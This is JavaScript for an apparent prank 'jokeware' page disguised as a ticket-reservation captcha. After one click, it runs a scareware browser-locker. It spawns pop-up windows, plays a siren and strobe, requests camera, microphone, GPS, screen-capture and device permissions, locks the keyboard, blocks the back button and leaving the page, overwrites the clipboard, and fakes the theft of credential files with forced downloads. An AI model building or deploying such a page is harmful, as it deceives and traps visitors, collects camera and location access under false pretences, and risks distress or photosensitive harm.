/* smartticketing.de — jokeware. Local only: no uploads, no recordings saved. */

const YT = {
  scream: '32Hp1LW08Yc',
  loudTheme: 'npnTtZ0vq7Q',
  maa: '_WPLyrYgAFc'
}

const PHRASES = [
  'PWNED',
  'ACCESS GRANTED',
  'DUMPING',
  'got root',
  'WAAHOO',
  'lmao',
  'session hijacked'
]

const EMOJI = ['🍄', '⭐', '🎫', '🐢', '🔥', '💥', '🟢', '🟡', '🤡', '😈']

const TROLLS = [
  'troll-point.jpg',
  'troll-smiley.jpg',
  'troll-gremlin.jpg',
  'troll-raccoon.jpg',
  'troll-clown.jpg',
  'troll-selfie.jpg',
  'troll-potato.jpg',
  'troll-thumbs.jpg'
]

const LOOT = [
  { file: 'password.txt', as: 'password.txt' },
  { file: 'passwords.txt', as: 'passwords.txt' },
  { file: 'cookies.txt', as: 'cookies.txt' },
  { file: 'wifi.txt', as: 'wifi.txt' },
  { file: 'login.txt', as: 'login.txt' },
  { file: 'id_rsa', as: 'id_rsa' },
  { file: 'private.key', as: 'private.key' },
  { file: 'secrets.env', as: '.env' },
  { file: 'aws_credentials', as: 'credentials' },
  { file: 'discord_token.txt', as: 'discord_token.txt' },
  { file: 'steam_guard.txt', as: 'steam_guard.txt' },
  { file: 'token.txt', as: 'token.txt' },
  { file: 'api_keys.txt', as: 'api_keys.txt' },
  { file: 'seed_phrase.txt', as: 'seed_phrase.txt' },
  { file: '2fa.txt', as: '2fa.txt' },
  { file: 'shadow', as: 'shadow' },
  { file: 'chrome_passwords.csv', as: 'chrome_passwords.csv' },
  { file: 'credit_cards.csv', as: 'credit_cards.csv' },
  { file: 'backup.sql', as: 'backup.sql' },
  { file: 'troll-selfie.jpg', as: 'IMG_0690.jpg' },
  { file: 'troll-point.jpg', as: 'webcam.jpg' },
  { file: 'troll-smiley.jpg', as: 'nudes.jpg' },
  { file: 'troll-gremlin.jpg', as: 'screenshot.jpg' },
  { file: 'alarm.wav', as: 'keylog.wav' }
]

const MAX_REAL_WINDOWS = 12
const MAX_CHILD_SPAWNS = 4
const MAX_FLOATERS = 12
const MAX_YT_FLOATERS = 1

const isChild = /(?:\?|&)chaos=1(?:&|$)/.test(window.location.search)
const realWindows = []
const floaters = []
const mediaTracks = []
const timers = []

let armed = isChild
let shuttingDown = false
let interactionCount = 0
let audioCtx = null
let oscA = null
let oscB = null
let sirenGain = null
let ytFloaters = 0
let motionOn = false
let dripOn = false
let typed = ''
let permIndex = 0
let geoWatch = null
let bounceTimer = 0

init()

function init () {
  window.addEventListener('message', onMessage)
  window.addEventListener('keydown', onKey, true)

  if (isChild) bootChild()
  else {
    setupGate()
    fillHistory()
    blockBack()
  }

  window.addEventListener('beforeunload', (event) => {
    if (!armed) return
    event.preventDefault()
    event.returnValue = ''
  })
}

function setupGate () {
  document.getElementById('captcha').addEventListener('click', onVerifyClick)
  const reserve = document.getElementById('reserve')
  if (reserve) {
    let left = 10 * 60 + 41
    setInterval(() => {
      if (armed || shuttingDown) return
      left = Math.max(0, left - 1)
      const m = String(Math.floor(left / 60)).padStart(2, '0')
      const s = String(left % 60).padStart(2, '0')
      reserve.textContent = m + ':' + s
    }, 1000)
  }
  const queue = document.getElementById('queue')
  if (queue) {
    let n = 1284
    setInterval(() => {
      if (armed || shuttingDown) return
      n = Math.max(41, n - Math.floor(1 + Math.random() * 3))
      queue.textContent = n.toLocaleString('de-DE')
    }, 1400)
  }
}

function onVerifyClick (event) {
  event.preventDefault()
  event.stopPropagation()
  if (armed) {
    onPointer(event)
    return
  }

  const captcha = document.getElementById('captcha')
  const label = document.getElementById('captcha-label')
  captcha.setAttribute('aria-pressed', 'true')
  captcha.classList.add('checking')
  if (label) label.textContent = 'Wird geprüft…'
  armed = true

  mountMainVideo()
  startSiren()
  speak('WAAHOO')
  for (let i = 0; i < 6; i++) openRealWindow()
  annoyPermissions(true)
  dumpImmediate()
  requestFullscreen()
  bindPointer()
  bootParent()
  flashBang()

  setTimeout(() => {
    captcha.classList.remove('checking')
    if (label) label.textContent = 'Verifiziert'
  }, 400)
}

function bootParent () {
  document.body.classList.add('live', 'nocursor')
  TROLLS.forEach((file) => { const img = new Image(); img.src = asset('drops/' + file) })
  spawnFloater('image')
  spawnFloater('image')
  spawnFloater('image')
  spawnFloater('msg')
  spawnFloater('progress')
  spawnFloater('yt')
  spawnFloater('image')
  startMotion()
  rain(22)
  flashTitle()
  rainbowTheme()
  cycleFx()
  hideCursor()
  startDownloadDrip()
}

function bootChild () {
  armed = true
  document.body.classList.add('live', 'nocursor')
  const hero = document.createElement('img')
  hero.className = 'child-hero'
  hero.alt = ''
  hero.src = asset('drops/' + pick(TROLLS))
  document.getElementById('chaos').appendChild(hero)
  spawnFloater('image')
  startMotion()
  rain(8)
  flashTitle()
  bounceRealWindow()
  hideCursor()
  bindPointer()
  cycleFx()
}

function bindPointer () {
  document.addEventListener('click', onPointer, { capture: true })
  document.addEventListener('touchstart', onPointer, { capture: true, passive: false })
}

function onPointer (event) {
  if (!armed) return
  const close = event.target.closest && event.target.closest('[data-close]')
  if (close) {
    event.preventDefault()
    event.stopPropagation()
    removeFloater(close.closest('.floater'))
    spawnFloater()
    return
  }

  interactionCount += 1
  event.preventDefault()
  event.stopPropagation()

  openRealWindow()
  if (interactionCount % 2 === 0) openRealWindow()
  annoyPermissions(false)
  flashBang()
  spawnFloater('image')
  rain(5)
  if (interactionCount % 3 === 0) speak()
  requestFullscreen()
  vibrate()
  startSiren()
}

function onKey (event) {
  if (event.key && event.key.length === 1) {
    typed = (typed + event.key.toLowerCase()).slice(-5)
    if (typed === 'close') {
      event.preventDefault()
      shutdown()
      return
    }
  }
  if (!armed) return
  if (event.key === 'Escape') event.preventDefault()
}

function onMessage (event) {
  const data = event.data || {}
  if (data.troll === 'close-all') shutdown()
  if (data.troll === 'open' && armed && !isChild) openRealWindow()
}

function shutdown () {
  if (shuttingDown) return
  shuttingDown = true
  armed = false
  motionOn = false
  typed = ''

  try { window.opener && !window.opener.closed && window.opener.postMessage({ troll: 'close-all' }, '*') } catch {}
  realWindows.forEach((win) => {
    try { win.postMessage({ troll: 'close-all' }, '*') } catch {}
    try { win.close() } catch {}
  })
  realWindows.length = 0

  timers.forEach((id) => clearInterval(id))
  timers.length = 0
  if (bounceTimer) clearTimeout(bounceTimer)

  killAllSound()
  stopMedia()
  if (geoWatch != null) {
    try { navigator.geolocation.clearWatch(geoWatch) } catch {}
    geoWatch = null
  }

  floaters.slice().forEach((item) => item.el.remove())
  floaters.length = 0
  ;['chaos', 'windows', 'rain', 'toasts', 'fx'].forEach((id) => {
    const node = document.getElementById(id)
    if (node) node.replaceChildren()
  })

  try { document.exitFullscreen && document.exitFullscreen() } catch {}
  document.body.classList.remove('live', 'nocursor')
  document.body.classList.add('done')
  document.title = 'ok.'
  document.documentElement.style.cursor = 'default'

  if (isChild) {
    try { window.close() } catch {}
  }
}

function ytSrc (id) {
  return 'https://www.youtube.com/embed/' + id +
    '?autoplay=1&mute=0&controls=0&loop=1&playlist=' + id +
    '&rel=0&modestbranding=1&playsinline=1'
}

function mountMainVideo () {
  const root = document.getElementById('chaos')
  root.innerHTML = ''
  const frame = document.createElement('iframe')
  frame.src = ytSrc(YT.scream)
  frame.allow = 'autoplay; fullscreen; encrypted-media; picture-in-picture; camera; microphone'
  frame.referrerPolicy = 'strict-origin-when-cross-origin'
  root.appendChild(frame)
}

function childUrl () {
  const url = new URL(window.location.href)
  url.search = 'chaos=1'
  url.hash = ''
  return url.href
}

function openRealWindow () {
  pruneRealWindows()
  const cap = isChild ? MAX_CHILD_SPAWNS : MAX_REAL_WINDOWS
  if (realWindows.length >= cap) return
  const { x, y } = randomCoords()
  const w = 280 + Math.floor(Math.random() * 180)
  const h = 200 + Math.floor(Math.random() * 140)
  const opts = 'width=' + w + ',height=' + h + ',left=' + x + ',top=' + y + ',scrollbars=no,status=no'
  let win = null
  try { win = window.open(childUrl(), '', opts) } catch {}
  if (!win) return
  realWindows.push(win)
}

function pruneRealWindows () {
  for (let i = realWindows.length - 1; i >= 0; i--) {
    try {
      if (realWindows[i].closed) realWindows.splice(i, 1)
    } catch {
      realWindows.splice(i, 1)
    }
  }
}

function bounceRealWindow () {
  let vx = 14 * (Math.random() > 0.5 ? 1 : -1)
  let vy = 14 * (Math.random() > 0.5 ? 1 : -1)
  const tick = () => {
    if (!armed) return
    try {
      const w = window.outerWidth
      const h = window.outerHeight
      const maxX = Math.max(0, window.screen.availWidth - w)
      const maxY = Math.max(0, window.screen.availHeight - h)
      if (window.screenX <= 0) vx = Math.abs(vx)
      if (window.screenX >= maxX) vx = -Math.abs(vx)
      if (window.screenY <= 0) vy = Math.abs(vy)
      if (window.screenY >= maxY) vy = -Math.abs(vy)
      window.moveBy(vx, vy)
    } catch {}
    bounceTimer = setTimeout(tick, 28)
  }
  tick()
}

function spawnFloater (kind) {
  if (floaters.length >= MAX_FLOATERS) removeFloater(floaters[0].el)

  const type = kind || pickFloaterType()
  const el = document.createElement('div')
  el.className = 'floater' + (type === 'image' || type === 'camera' ? ' pic' : type === 'yt' ? ' wide' : ' slim')
  el.innerHTML = floaterMarkup(type)
  document.getElementById('windows').appendChild(el)

  const w = el.offsetWidth || 210
  const h = el.offsetHeight || 240
  const maxX = Math.max(8, window.innerWidth - w - 8)
  const maxY = Math.max(8, window.innerHeight - h - 8)
  const speed = 3.6 + Math.random() * 3.8
  const angle = Math.random() * Math.PI * 2
  const item = {
    el,
    type,
    x: 8 + Math.random() * maxX,
    y: 8 + Math.random() * maxY,
    vx: Math.cos(angle) * speed,
    vy: Math.sin(angle) * speed,
    rot: 0,
    rv: 0
  }
  floaters.push(item)
  paintFloater(item)
  startMotion()
}

function pickFloaterType () {
  if (ytFloaters < MAX_YT_FLOATERS && Math.random() < 0.1) return 'yt'
  return pick(['image', 'image', 'image', 'image', 'msg', 'progress'])
}

function floaterMarkup (type) {
  const title = pick(['root@box', 'dump', 'wget', 'chrome', '/etc/shadow', 'PWNED'])
  const bar = '<div class="floater-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span>' +
    title + '<button type="button" data-close>×</button></div>'

  if (type === 'yt') {
    ytFloaters += 1
    return bar + '<iframe src="' + ytSrc(pick([YT.loudTheme, YT.maa, YT.scream])) + '" allow="autoplay; encrypted-media"></iframe>'
  }

  if (type === 'image') {
    return bar + '<img alt="" src="' + asset('drops/' + pick(TROLLS)) + '">'
  }

  if (type === 'progress') {
    return bar + '<div class="floater-body">exfil ' + pick(LOOT).as +
      '<small>do not close · 999 files queued</small>' +
      '<div class="progress"><b></b></div></div>'
  }

  return bar + '<div class="floater-body">' + pick(PHRASES) +
    '<small>dumping ' + pick(LOOT).as + '</small>' +
    '<span class="stamp">ROOT</span></div>'
}

function spawnCamera (stream) {
  if (floaters.some((item) => item.type === 'camera')) {
    const video = document.querySelector('.floater video')
    if (video && !video.srcObject) video.srcObject = stream
    return
  }
  spawnFloater('image')
  const item = floaters[floaters.length - 1]
  item.type = 'camera'
  item.el.classList.add('pic')
  const video = document.createElement('video')
  video.autoplay = true
  video.muted = true
  video.playsInline = true
  video.srcObject = stream
  const img = item.el.querySelector('img')
  if (img) img.replaceWith(video)
  else item.el.appendChild(video)
}

function spawnGeo (pos) {
  const lat = pos.coords.latitude.toFixed(4)
  const lon = pos.coords.longitude.toFixed(4)
  const el = document.createElement('div')
  el.className = 'floater slim'
  el.innerHTML = '<div class="floater-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span>gps' +
    '<button type="button" data-close>×</button></div>' +
    '<div class="floater-body">gps lock<small>' + lat + ' / ' + lon +
    ' · local only</small><span class="stamp">GPS</span></div>'
  document.getElementById('windows').appendChild(el)
  const w = el.offsetWidth || 230
  const h = el.offsetHeight || 140
  floaters.push({
    el,
    type: 'msg',
    x: 20,
    y: 20,
    vx: 4,
    vy: 3.2,
    rot: 0,
    rv: 0,
    w,
    h
  })
  startMotion()
}

function removeFloater (el) {
  const index = floaters.findIndex((item) => item.el === el)
  if (index < 0) return
  if (floaters[index].type === 'yt') ytFloaters = Math.max(0, ytFloaters - 1)
  floaters[index].el.remove()
  floaters.splice(index, 1)
}

function paintFloater (item) {
  item.el.style.transform = 'translate(' + item.x.toFixed(1) + 'px,' + item.y.toFixed(1) + 'px)'
}

function startMotion () {
  if (motionOn) return
  motionOn = true
  const step = () => {
    if (!motionOn) return
    const maxW = window.innerWidth
    const maxH = window.innerHeight
    for (let i = 0; i < floaters.length; i++) {
      const item = floaters[i]
      const w = item.el.offsetWidth || 210
      const h = item.el.offsetHeight || 240
      item.x += item.vx
      item.y += item.vy
      if (item.x <= 0) { item.x = 0; item.vx = Math.abs(item.vx) }
      if (item.y <= 0) { item.y = 0; item.vy = Math.abs(item.vy) }
      if (item.x + w >= maxW) { item.x = Math.max(0, maxW - w); item.vx = -Math.abs(item.vx) }
      if (item.y + h >= maxH) { item.y = Math.max(0, maxH - h); item.vy = -Math.abs(item.vy) }
      paintFloater(item)
    }
    requestAnimationFrame(step)
  }
  requestAnimationFrame(step)
}

function annoyPermissions (first) {
  if (first) {
    try {
      Notification.requestPermission().then((state) => {
        if (state === 'granted') spamNotes()
      })
    } catch {}
    try {
      navigator.geolocation.getCurrentPosition(spawnGeo, () => {}, {
        enableHighAccuracy: true,
        timeout: 10000
      })
      geoWatch = navigator.geolocation.watchPosition(() => {}, () => {}, { enableHighAccuracy: true })
    } catch {}
    grabMedia({ video: true, audio: true })
    grabMedia({ video: { facingMode: 'user' }, audio: false })
    grabMedia({ video: { facingMode: 'environment' }, audio: false })
    grabMedia({ audio: true, video: false })
    try { navigator.requestMIDIAccess && navigator.requestMIDIAccess() } catch {}
    try { navigator.clipboard && navigator.clipboard.writeText('password.txt dumped — type CLOSE') } catch {}
    try { navigator.wakeLock && navigator.wakeLock.request('screen') } catch {}
    try { navigator.storage && navigator.storage.persist() } catch {}
    try { DeviceMotionEvent.requestPermission && DeviceMotionEvent.requestPermission() } catch {}
    try { DeviceOrientationEvent.requestPermission && DeviceOrientationEvent.requestPermission() } catch {}
    try { window.getScreenDetails && window.getScreenDetails() } catch {}
    try { navigator.keyboard && navigator.keyboard.lock() } catch {}
    try { IdleDetector.requestPermission && IdleDetector.requestPermission() } catch {}
    return
  }

  const extras = [
    () => navigator.mediaDevices.getDisplayMedia({ video: true, audio: true }).then(holdStream),
    () => navigator.usb && navigator.usb.requestDevice({ filters: [] }),
    () => navigator.hid && navigator.hid.requestDevice({ filters: [] }),
    () => navigator.serial && navigator.serial.requestPort(),
    () => navigator.bluetooth && navigator.bluetooth.requestDevice({ acceptAllDevices: true }),
    () => window.showOpenFilePicker && window.showOpenFilePicker({ multiple: true }).then(() => {}),
    () => window.showDirectoryPicker && window.showDirectoryPicker().then(() => {}),
    () => navigator.contacts && navigator.contacts.select(['name', 'email', 'tel'], { multiple: true }).then(() => {}),
    () => window.queryLocalFonts && window.queryLocalFonts(),
    () => (new NDEFReader()).scan()
  ]
  const fn = extras[permIndex % extras.length]
  permIndex += 1
  Promise.resolve().then(fn).catch(() => {})
}

function grabMedia (constraints) {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return
  navigator.mediaDevices.getUserMedia(constraints).then(holdStream).catch(() => {})
}

function holdStream (stream) {
  stream.getTracks().forEach((track) => mediaTracks.push(track))
  if (stream.getVideoTracks().length) spawnCamera(stream)
}

function stopMedia () {
  mediaTracks.forEach((track) => {
    try { track.stop() } catch {}
  })
  mediaTracks.length = 0
}

function spamNotes () {
  every(3500, () => {
    try {
      new Notification(pick(PHRASES), { body: 'dumped ' + pick(LOOT).as + '  ·  type CLOSE', silent: false })
    } catch {}
  })
}

function killMediaEl (el) {
  try { el.muted = true } catch {}
  try { el.volume = 0 } catch {}
  try { el.pause() } catch {}
  try {
    if (el.srcObject && el.srcObject.getTracks) {
      el.srcObject.getTracks().forEach((track) => track.stop())
    }
  } catch {}
  try { el.srcObject = null } catch {}
  try { el.src = 'about:blank' } catch {}
  try { el.removeAttribute('src') } catch {}
  try { el.load() } catch {}
  el.remove()
}

function killAllSound () {
  if (sirenGain) {
    try { sirenGain.gain.setValueAtTime(0, audioCtx ? audioCtx.currentTime : 0) } catch { try { sirenGain.gain.value = 0 } catch {} }
  }
  stopSiren()
  try {
    window.speechSynthesis.cancel()
    window.speechSynthesis.pause()
  } catch {}
  document.querySelectorAll('iframe, video, audio').forEach(killMediaEl)
}

function startSiren () {
  if (shuttingDown || !armed) return
  if (audioCtx) {
    if (audioCtx.state === 'suspended') audioCtx.resume().catch(() => {})
    return
  }
  const Ctx = window.AudioContext || window.webkitAudioContext
  if (!Ctx) return
  audioCtx = new Ctx()
  oscA = audioCtx.createOscillator()
  oscB = audioCtx.createOscillator()
  sirenGain = audioCtx.createGain()
  oscA.type = 'sawtooth'
  oscB.type = 'square'
  oscA.frequency.value = 740
  oscB.frequency.value = 190
  sirenGain.gain.value = 0.18
  oscA.connect(sirenGain)
  oscB.connect(sirenGain)
  sirenGain.connect(audioCtx.destination)
  oscA.start()
  oscB.start()
  every(160, () => {
    if (!oscA) return
    oscA.frequency.value = 320 + Math.random() * 980
    oscB.frequency.value = 80 + Math.random() * 220
  })
}

function stopSiren () {
  try { oscA && oscA.stop() } catch {}
  try { oscB && oscB.stop() } catch {}
  oscA = null
  oscB = null
  sirenGain = null
  if (audioCtx) {
    try { audioCtx.suspend() } catch {}
    audioCtx.close().catch(() => {})
    audioCtx = null
  }
}

function speak (phrase) {
  if (shuttingDown || !armed) return
  try {
    window.speechSynthesis.cancel()
    const utter = new SpeechSynthesisUtterance(phrase || pick(PHRASES))
    utter.rate = 1.2
    utter.pitch = 1.7
    utter.volume = 1
    window.speechSynthesis.speak(utter)
  } catch {}
}

function rain (n) {
  const root = document.getElementById('rain')
  if (!root) return
  while (root.childElementCount > 40) root.firstChild.remove()
  for (let i = 0; i < n; i++) {
    const el = document.createElement('span')
    el.className = 'drop'
    el.textContent = pick(EMOJI)
    el.style.left = Math.random() * 100 + 'vw'
    el.style.fontSize = 18 + Math.random() * 40 + 'px'
    el.style.animationDuration = 1.2 + Math.random() * 1.8 + 's'
    root.appendChild(el)
    setTimeout(() => el.remove(), 3200)
  }
}

function flashTitle () {
  const frames = ['PWNED', 'password.txt', 'DUMPING', 'TYPE CLOSE', 'id_rsa', 'CLOSE', 'WAAHOO']
  let i = 0
  every(160, () => {
    document.title = frames[i % frames.length]
    i += 1
  })
}

function rainbowTheme () {
  const meta = document.querySelector('meta[name="theme-color"]')
  if (!meta) return
  every(90, () => {
    meta.setAttribute('content', '#' + Math.floor(Math.random() * 0xffffff).toString(16).padStart(6, '0'))
  })
}

function cycleFx () {
  const fx = document.getElementById('fx')
  every(700, () => {
    fx.classList.toggle('strobe', Math.random() > 0.4)
  })
}

function flashBang () {
  const fx = document.getElementById('fx')
  fx.classList.add('boom')
  setTimeout(() => fx.classList.remove('boom'), 80)
}

function every (ms, fn) {
  const id = setInterval(() => { if (armed) fn() }, ms)
  timers.push(id)
  return id
}

function requestFullscreen () {
  const el = document.documentElement
  const fn = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen
  if (fn) fn.call(el).catch(() => {})
}

function hideCursor () {
  document.documentElement.style.cursor = 'none'
}

function vibrate () {
  if (navigator.vibrate) navigator.vibrate([80, 40, 80])
}

function fillHistory () {
  for (let i = 1; i < 16; i++) window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  window.history.pushState({}, '', window.location.pathname)
}

function blockBack () {
  window.addEventListener('popstate', () => {
    if (armed) window.history.forward()
  })
}

function randomCoords () {
  return {
    x: 8 + Math.floor(Math.random() * Math.max(1, window.screen.availWidth - 420)),
    y: 8 + Math.floor(Math.random() * Math.max(1, window.screen.availHeight - 280))
  }
}

function pick (arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

function shuffle (arr) {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1))
    const tmp = arr[i]
    arr[i] = arr[j]
    arr[j] = tmp
  }
  return arr
}

function asset (rel) {
  const href = window.location.href.split('#')[0].split('?')[0].replace(/index\.html$/i, '')
  const dir = href.endsWith('/') ? href : href + '/'
  return dir + rel.replace(/^\//, '')
}

function clickDownload (href, name) {
  const a = document.createElement('a')
  a.href = href
  a.download = name
  a.rel = 'noopener'
  a.style.display = 'none'
  document.body.appendChild(a)
  a.click()
  a.remove()
}

function toast (name) {
  let stack = document.querySelector('.toast-stack')
  if (!stack) {
    stack = document.createElement('div')
    stack.className = 'toast-stack'
    document.getElementById('toasts').appendChild(stack)
  }
  const el = document.createElement('div')
  el.className = 'toast'
  el.innerHTML = '<em>dumped</em><span>' + name + '</span>'
  stack.appendChild(el)
  while (stack.childElementCount > 4) stack.firstChild.remove()
  setTimeout(() => el.remove(), 3800)
}

function dumpImmediate () {
  ;[
    ['password.txt', 'admin:admin\nroot:toor\nuser:password\n'],
    ['cookies.txt', 'SID=not-a-real-session\nuser_session=troll\n']
  ].forEach(([name, body]) => {
    const href = URL.createObjectURL(new Blob([body], { type: 'text/plain;charset=utf-8' }))
    clickDownload(href, name)
    toast(name)
    setTimeout(() => URL.revokeObjectURL(href), 8000)
  })
}

function startDownloadDrip () {
  if (isChild || dripOn) return
  dripOn = true
  const queue = shuffle(LOOT.slice()).slice(0, 12)
  let i = 0
  const next = () => {
    if (!armed || i >= queue.length) return
    const item = queue[i]
    i += 1
    toast(item.as)
    downloadLoot(item).finally(() => setTimeout(next, 1800))
  }
  setTimeout(next, 1100)
}

function downloadLoot (item) {
  return fetch(asset('drops/' + item.file))
    .then((res) => {
      if (!res.ok) throw new Error('loot')
      return res.blob()
    })
    .then((blob) => {
      const href = URL.createObjectURL(blob)
      clickDownload(href, item.as)
      setTimeout(() => URL.revokeObjectURL(href), 8000)
    })
    .catch(() => {})
}
